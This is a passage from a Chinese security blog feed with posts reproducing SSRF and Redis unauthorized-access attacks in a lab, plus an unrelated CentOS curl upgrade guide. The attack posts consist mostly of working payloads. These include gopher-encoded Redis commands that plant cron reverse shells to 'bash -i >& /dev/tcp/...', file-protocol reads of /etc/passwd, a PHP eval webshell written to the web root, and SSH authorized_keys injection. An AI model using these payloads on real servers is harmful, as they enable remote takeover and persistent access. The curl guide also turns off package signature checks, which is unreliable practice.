class="line">1</div></pre></td><td class="code"><pre><div class="line">python tran2gopher.py redis.log</div></pre></td></tr></table></figure><p><strong>其中redis.log为刚刚抓取到的redis攻击流量</strong><br><img src="http://pic.c1imber.top/blog/180826/5Gf0bKbjkB.png?imageslim" alt="mark"><br><strong>经过转化后内容如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*3%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$3</span>%0d%0aaaa%0d%0a<span class="variable">$58</span>%0d%0a%0a%0a* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a<span class="variable">$6</span>%0d%0aconfig%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$3</span>%0d%0adir%0d%0a<span class="variable">$15</span>%0d%0a/var/spool/cron%0d%0a*4%0d%0a<span class="variable">$6</span>%0d%0aconfig%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$10</span>%0d%0adbfilename%0d%0a<span class="variable">$4</span>%0d%0aroot%0d%0a*1%0d%0a<span class="variable">$4</span>%0d%0asave%0d%0a*1%0d%0a<span class="variable">$4</span>%0d%0aquit%0d%0a%0a</div></pre></td></tr></table></figure><p><strong>在本地使用curl的gopher协议测试一下</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0aaaa%0d%0a$58%0d%0a%0a%0a* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a'</span></div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/eBC0agfj8L.png?imageslim" alt="mark"><br><strong>之后可以看到利用gpoher协议成功向任务计划目录下写了一个反弹shell的任务计划</strong><br><img src="http://pic.c1imber.top/blog/180826/09DjgED6if.png?imageslim" alt="mark"><br><strong>成功反弹shell</strong><br><img src="http://pic.c1imber.top/blog/180826/KF24aD93Ef.png?imageslim" alt="mark"></p><h3 id="ssrf漏洞实例"><a href="#ssrf漏洞实例" class="headerlink" title="ssrf漏洞实例"></a>ssrf漏洞实例</h3><p><strong>存在ssrf漏洞的代码<code>ssrf.php</code>如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">&lt;title&gt;ssrf漏洞实例&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;form action=<span class="string">""</span>&gt;</div><div class="line">input:&lt;input type=<span class="string">"text"</span> name=<span class="string">"url"</span> value=<span class="string">""</span>/&gt;</div><div class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"get"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))</div><div class="line">&#123;</div><div class="line">       $ch = curl_init(); </div><div class="line">       curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </div><div class="line">       <span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></div><div class="line">       curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </div><div class="line">       <span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP |CURLPROTO_HTTPS);</span></div><div class="line">       curl_exec($ch); </div><div class="line">       curl_close($ch); </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>漏洞场景：web应用实现了从其他服务器获取资源的功能，由于对url过滤不严而产生ssrf漏洞</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=http%3A%2F%2Fwww.4o4notfound.org%2Findex.php%2Farchives%2F33%2F&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/J6CfGcEE46.png?imageslim" alt="mark"></p><p><strong>首先查看php-curl扩展所支持的curl协议</strong><br><img src="http://pic.c1imber.top/blog/180826/ei4i2KHI8j.png?imageslim" alt="mark"><br><strong>使用dict协议对本地服务进行探测,探测ssh服务版本payload:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=dict%3A%2F%2F127.0.0.1%3A22%2Finfo&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/2Lkjme2gk4.png?imageslim" alt="mark"><br><strong>探测redis服务版本payload:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=dict%3A%2F%2F127.0.0.1%3A6379%2Finfo&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/iJkI2mFLH4.png?imageslim" alt="mark"><br><strong>使用file协议读取服务器文件payload：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=file%3A%2F%2F%2Fetc%2Fpasswd&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/ekjlF5eJ12.png?imageslim" alt="mark"><br><strong>使用gopher协议攻击本地redis反弹shell payload：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_*3%250d%250a%243%250d%250aset%250d%250a%243%250d%250aaaa%250d%250a%2458%250d%250a%250a%250a*+*+*+*+*+bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.109%2F7777+0%3E%261%250a%250a%250a%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2415%250d%250a%2Fvar%2Fspool%2Fcron%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a%250a&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/im7DLj8FEH.png?imageslim" alt="mark"><br><strong>可以看到成功通过gopher协议攻击了本地的redis服务，向任务计划目录下写了一个反弹shell的cron文件</strong><br><img src="http://pic.c1imber.top/blog/180826/d26K0ef5fk.png?imageslim" alt="mark"><br><strong>在kali上成功反弹到了shell</strong><br><img src="http://pic.c1imber.top/blog/180826/J2mHj0hfj9.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ssrf漏洞原理以及利用方法&quot;&gt;&lt;a href=&quot;#ssrf漏洞原理以及利用方法&quot; class=&quot;headerlink&quot; title=&quot;ssrf漏洞原理以及利用方法&quot;&gt;&lt;/a&gt;ssrf漏洞原理以及利用方法&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://lawlietweb.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssrf" scheme="http://lawlietweb.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>Centos6 更新curl版本</title>
    <link href="http://lawlietweb.com/2018/08/26/2018-08-26/"/>
    <id>http://lawlietweb.com/2018/08/26/2018-08-26/</id>
    <published>2018-08-25T23:53:23.000Z</published>
    <updated>2018-12-19T11:31:27.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Centos6-更新curl版本"><a href="#Centos6-更新curl版本" class="headerlink" title="Centos6 更新curl版本"></a>Centos6 更新curl版本</h1><p><strong>由于自己的Centos6.5 curl版本为7.19.7，版本太低，所以要升级curl的版本，之前自己直接采取了源码安装最新版本的方式去升级，结果导致安装完毕后自己电脑的curl版本和php-curl版本不一致的问题</strong><br><img src="http://pic.c1imber.top/blog/180826/IBHCm64DGe.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180826/Ekhi4h6K4a.png?imageslim" alt="mark"><br><strong>于是自己上网查了好久，终于找到了解决办法，在这里记录一下</strong><br><a id="more"></a></p><h3 id="更新Centos6-curl为最新版本"><a href="#更新Centos6-curl为最新版本" class="headerlink" title="更新Centos6 curl为最新版本"></a>更新Centos6 curl为最新版本</h3><p><strong>在这里使用 city-fan 的更新源来更新。</strong></p><p><strong>1.更新 ca-bundle</strong></p><p><strong>首先备份一下：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp /etc/pki/tls/certs/ca-bundle.crt /etc/pki/tls/certs/ca-bundle.crt.bak</div></pre></td></tr></table></figure></p><p><strong>更新并替换：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://curl.haxx.se/ca/cacert.pem -o /etc/pki/tls/certs/ca-bundle.crt</div></pre></td></tr></table></figure></p><p><strong>2 新增 repo 源</strong></p><p><strong>新增 repo：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/yum.repos.d/city-fan-for-curl.repo</div></pre></td></tr></table></figure></p><p><strong>Centos6 编辑为如下:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[CityFanforCurl]</div><div class="line">name=City Fan Repo</div><div class="line">baseurl=http://www.city-fan.org/ftp/contrib/yum-repo/rhel6/x86_64/</div><div class="line">enabled=0</div><div class="line">gpgcheck=0</div></pre></td></tr></table></figure></p><p><strong>Centos7 编辑为如下：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[CityFanforCurl]</div><div class="line">name=City Fan Repo</div><div class="line">baseurl=http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/</div><div class="line">enabled=0</div><div class="line">gpgcheck=0</div></pre></td></tr></table></figure></p><p><strong>3.更新curl</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum update curl --enablerepo=CityFanforCurl -y</div></pre></td></tr></table></figure><p><strong>4.重启服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service php-fpm restart</div><div class="line">service httpd restart</div></pre></td></tr></table></figure><p><strong>这时可以看到版本就一致了</strong><br><img src="http://pic.c1imber.top/blog/180826/841L8IiaBf.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180826/ei4i2KHI8j.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Centos6-更新curl版本&quot;&gt;&lt;a href=&quot;#Centos6-更新curl版本&quot; class=&quot;headerlink&quot; title=&quot;Centos6 更新curl版本&quot;&gt;&lt;/a&gt;Centos6 更新curl版本&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;由于自己的Centos6.5 curl版本为7.19.7，版本太低，所以要升级curl的版本，之前自己直接采取了源码安装最新版本的方式去升级，结果导致安装完毕后自己电脑的curl版本和php-curl版本不一致的问题&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;http://pic.c1imber.top/blog/180826/IBHCm64DGe.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://pic.c1imber.top/blog/180826/Ekhi4h6K4a.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;br&gt;&lt;strong&gt;于是自己上网查了好久，终于找到了解决办法，在这里记录一下&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="其它" scheme="http://lawlietweb.com/categories/%E5%85%B6%E5%AE%83/"/>
    
    
      <category term="Linux" scheme="http://lawlietweb.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>centos环境下的redis未授权访问漏洞的几种利用方式</title>
    <link href="http://lawlietweb.com/2018/08/19/redis/"/>
    <id>http://lawlietweb.com/2018/08/19/redis/</id>
    <published>2018-08-18T16:57:33.000Z</published>
    <updated>2018-12-19T11:30:44.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="centos环境下的redis未授权访问漏洞的几种利用方式"><a href="#centos环境下的redis未授权访问漏洞的几种利用方式" class="headerlink" title="centos环境下的redis未授权访问漏洞的几种利用方式"></a>centos环境下的redis未授权访问漏洞的几种利用方式</h1><p><strong>这篇文章记录一下redis未授权访问漏洞的几种利用方式,包括如何利用redis未授权访问漏洞通过任务计划反弹shell，向网站根目录写webshell以及利用redis未授权访问向服务器写入ssh公钥</strong><br><a id="more"></a></p><h3 id="漏洞利用环境"><a href="#漏洞利用环境" class="headerlink" title="漏洞利用环境"></a>漏洞利用环境</h3><p><strong>靶机：centos6.4:192.168.0.104，开启了redis-server，由于配置不当而存在redis未授权访问</strong></p><p><strong>攻击机：kali2.0：192.168.0.101，用来攻击配置不当导致存在redis未授权访问漏洞的centos6.4</strong></p><p><strong>修改centos中redis配置文件redis.conf中的几个地方</strong></p><pre><code>1.bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句</code></pre><p><img src="http://pic.c1imber.top/blog/180819/L7g94HcIji.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180819/8E377C775B.png?imageslim" alt="mark"><br><strong>只有修改了这两处配置，才能远程连接redis服务并且执行数据库语句</strong></p><h3 id="利用redis未授权访问漏洞反弹shell"><a href="#利用redis未授权访问漏洞反弹shell" class="headerlink" title="利用redis未授权访问漏洞反弹shell"></a>利用redis未授权访问漏洞反弹shell</h3><p><strong>首先在centos上开启redis服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./src/redis-server redis.conf</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/DF7D9Cm9AG.png?imageslim" alt="mark"></p><p><strong>接下来使用kali上的redis-cli去访问redis-server</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./src/redis-cli -h 192.168.0.104 -p 6379</div></pre></td></tr></table></figure><p><strong>可以看到由于配置不当导致redis未授权访问漏洞，可以直接进入redis的交互式shell</strong><br><img src="http://pic.c1imber.top/blog/180819/AelG2eB0m2.png?imageslim" alt="mark"></p><p><strong>下面通过该redis未授权访问漏洞利用linux任务计划来反弹一个shell到我们的kali上面</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/spool/cron</div><div class="line">config <span class="built_in">set</span> dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/56CBadKaEl.png?imageslim" alt="mark"><br><strong>在redis的交互shell中依次执行完上述命令后，可以看到成功的在centos的任务计划目录<code>/var/spool/cron</code>下创建了一个任务计划文件root，该文件里面的cron将执行每分钟执行一次向kali反弹shell的操作</strong><br><img src="http://pic.c1imber.top/blog/180819/l2k14IibBm.png?imageslim" alt="mark"></p><p><strong>可以看到我们的kali上已经接收到了centos反弹过来的shell，可以执行命令</strong><br><img src="http://pic.c1imber.top/blog/180819/Bc3EL7h89K.png?imageslim" alt="mark"></p><h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p><strong>还可以通过redis未授权访问漏洞向网站根目录写一个webshell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n&lt;?php @eval(<span class="variable">$_POST</span>['c1imber']);?&gt;\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/www/html</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/DE4e2A3L0D.png?imageslim" alt="mark"><br><strong>可以看到成功向网站根目录写了一个webshell</strong><br><img src="http://pic.c1imber.top/blog/180819/670dgDIH27.png?imageslim" alt="mark"><br><strong>访问该webshell，php一句话木马被解析</strong><br><img src="http://pic.c1imber.top/blog/180819/2D4BG6ebkA.png?imageslim" alt="mark"></p><h3 id="利用redis未授权访问向服务器写入ssh公钥"><a href="#利用redis未授权访问向服务器写入ssh公钥" class="headerlink" title="利用redis未授权访问向服务器写入ssh公钥"></a>利用redis未授权访问向服务器写入ssh公钥</h3><p><strong>该漏洞的前提需要centos允许使用shh密钥去登陆</strong></p><p><strong>接下来首先使用kali在本地生成一对密钥</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/D5KF0LHCbI.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180819/hBIBd9J9kf.png?imageslim" alt="mark"><br><strong>之后将公钥<code>id_rsa.pub</code>写入到一个文件内</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>)&gt;key.txt</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/HGJfgl2HGf.png?imageslim" alt="mark"><br><strong>之后利用redis未授权访问漏洞将公钥写到centos的<code>/root/.ssh/authorized_keys</code>文件中</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat /root/.ssh/key.txt | ./src/redis-cli -h 192.168.0.4 -x <span class="built_in">set</span> aaa</div><div class="line">redis -h 192.168.0.4 -p 6379</div><div class="line">config <span class="built_in">set</span> dir /root/.ssh</div><div class="line">config <span class="built_in">set</span> dbfilename authorized_keys</div><div class="line">save</div></pre></td></tr></table></figure><p><strong>其中<code>-x</code>参数代表读取输入流里的内设置给aaa，也就是之前生成的公钥<code>/root/.ssh/key.txt</code>里面的内容</strong><br><img src="http://pic.c1imber.top/blog/180819/c9G6E82kGG.png?imageslim" alt="mark"><br><strong>可以看到在centos的<code>/root/.ssh</code>目录下的<code>authorized_keys</code>文件里已经成功写入了我们刚刚生成的公钥</strong><br><img src="http://pic.c1imber.top/blog/180819/7ll8jEI5lJ.png?imageslim" alt="mark"><br><strong>由于我们将公钥写入了服务器，我们自己这有私钥，之后就可以使用ssh直接远程登陆了</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh 192.168.0.4</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/gd8GC6lbie.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;centos环境下的redis未授权访问漏洞的几种利用方式&quot;&gt;&lt;a href=&quot;#centos环境下的redis未授权访问漏洞的几种利用方式&quot; class=&quot;headerlink&quot; title=&quot;centos环境下的redis未授权访问漏洞的几种利用方式&quot;&gt;&lt;/a&gt;centos环境下的redis未授权访问漏洞的几种利用方式&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这篇文章记录一下redis未授权访问漏洞的几种利用方式,包括如何利用redis未授权访问漏洞通过任务计划反弹shell，向网站根目录写webshell以及利用redis未授权访问向服务器写入ssh公钥&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://lawlietweb.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://lawlietweb.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现</title>
    <link href="http://lawlietweb.com/2018/08/19/2018-08-19/"/>
    <id>http://lawlietweb.com/2018/08/19/2018-08-19/</id>
    <published>2018-08-18T16:16:18.000Z</published>
    <updated>2018-12-19T11:29:52.477Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"><a href="#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现" class="headerlink" title="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"></a>记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现</h1><p><strong>由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的<a href="http://lawlietweb.com/2018/08/17/2018-08-17/#more">解决ubuntu任务计划写shell失败的问题</a>和<a href="http://lawlietweb.com/2018/08/18/2018-08-18/#more">关于ubuntu和centos cron的一些区别</a>这两篇文章</strong><br><a id="more"></a></p><h3 id="漏洞环境及搭建"><a href="#漏洞环境及搭建" class="headerlink" title="漏洞环境及搭建"></a>漏洞环境及搭建</h3><p><strong>ubuntu16.04（192.168.0.107）：安装了redis服务的靶机,作为redis-server</strong></p><p><strong>kali2.0（192.168.0.101）：攻击者机器，同样安装了redis，要使用redis-cli对未授权访问漏洞进行利用</strong></p><p><strong>该实验中redis的版本为4.0.8，安装redis方法如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</div><div class="line">tar –xvf redis-4.0.8.tar.gz</div><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">make</div><div class="line">make install（加入到用户环境变量/usr/<span class="built_in">local</span>/bin）</div></pre></td></tr></table></figure><p><strong>ubuntu安装完redis后，还需要修改redis配置文件redis.conf里面的几个地方</strong></p><pre><code>1.bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句</code></pre><p><img src="http://pic.c1imber.top/blog/180816/HkF3EJj621.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180816/31fij0h7l1.png?imageslim" alt="mark"></p><h3 id="尝试利用linux任务计划文件去反弹shell"><a href="#尝试利用linux任务计划文件去反弹shell" class="headerlink" title="尝试利用linux任务计划文件去反弹shell"></a>尝试利用linux任务计划文件去反弹shell</h3><p><strong>首先在ubuntu上开启redis服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">./src/redis-server redis.conf</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/li4i2IkkDB.png?imageslim" alt="mark"></p><p><strong>由于redis的默认配置会直接导致未授权访问，所以在kali上使用redis-cli去访问ubuntu靶机上的redis服务，这里看到可以直接进入redis的交互式shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">./src/redis-cli -h 192.168.0.107 -p 6379</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/fffCjfk2Ie.png?imageslim" alt="mark"><br><strong>现在尝试结合linux任务计划文件去反弹一个shell到自己的kali上面。</strong></p><p><strong>首先简单来说一下linux中的任务计划文件，简单来说，任务计划指的就是使系统定时的去执行一些我们设置的任务，来看一下该文件的格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /etc/crontab</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180816/9EDGkJ5K49.png?imageslim" alt="mark"></p><p><strong>里面的参数和一些符号含义如下</strong></p><pre><code>m:分钟 - 从0到59的整数h:小时 - 从0到23的整数dom:天 - 从1到31的整数 (必须是指定月份的有效日期)mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份)dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)user:指的是执行命令的用户command: 需要执行的命令星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务</code></pre><p><strong>ubuntu下可以利用的cron有以下几个地方</strong></p><pre><code>/etc/crontab：该文件里面的任务计划可以直接执行/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600</code></pre><p><strong>知道了以上的知识，可以通过redis未授权访问漏洞向ubuntu的<code>/etc/cron.d</code>目录下写任务计划文件去反弹shell,首先在kali上监听端口等待连接，我的思路是这样的，首先向/etc/cron.d下写一个任务计划文件step1，文件内容为<code>* * * * * root ln -s -f bash /bin/sh</code>，首先将ubuntu的cron的shell环境由dash改为bash，这样才可以使用交互式命令，之后再在<code>/etc/cron.d</code>目录下创建一个任务计划文件step2，内容为<code>* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1</code>,也就是使用交互式的bash去反弹shell到kali</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 7777</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/bbl7Dm2Hea.png?imageslim" alt="mark"><br><strong>接下来在redis-cli命令行输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\n\n* * * * * root ln -s -f bash /bin/sh\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /etc/cron.d</div><div class="line">config <span class="built_in">set</span> dbfilename step1</div><div class="line">save</div><div class="line"><span class="built_in">set</span> bbb <span class="string">"\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /etc/cron.d</div><div class="line">config <span class="built_in">set</span> dbfilename step2</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/gGeJheDh71.png?imageslim" 